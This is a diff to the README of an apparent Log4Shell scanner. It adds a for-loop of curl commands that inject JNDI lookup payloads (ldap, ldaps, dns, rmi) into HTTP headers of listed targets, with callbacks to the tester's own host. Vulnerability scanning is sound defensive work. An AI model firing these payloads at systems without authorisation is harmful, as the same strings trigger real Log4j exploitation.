@@ -29,9 +29,9 @@ If you prefer to test the intranet facing target, then you simply make sure that
  apt install iptables iptables-persistence rsyslog curl vim
  
  systemctl restart rsyslog
- 
 ```
 ## Download the script
+
 ```bash
 git clone https://github.com/defcon250/log4jScanner
 ```
@@ -43,11 +43,12 @@ git clone https://github.com/defcon250/log4jScanner
   ./log4jScanner.sh  <Target-IP>:<Target-Port>  <Scanner-Return-Traffic-Port>  
   
   [Example: ./log4jScanner.sh 192.168.1.100:443 1389]
-
 ```
-## For testing multiple IP/URLs, please feel free to modify the script accordingly.
+## To automate testing of multiple IP/URLs, please feel free to modify the script accordingly.
+
 ```bash
-FOR loop example: 
+Hint: While refering the log4jScanner.sh, consider modifying the script to include the following for-loop.
+
 for i in $(cat /tmp/urls.txt); do timeout 2 curl -ksqL http://"$i" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; done
 ````
 
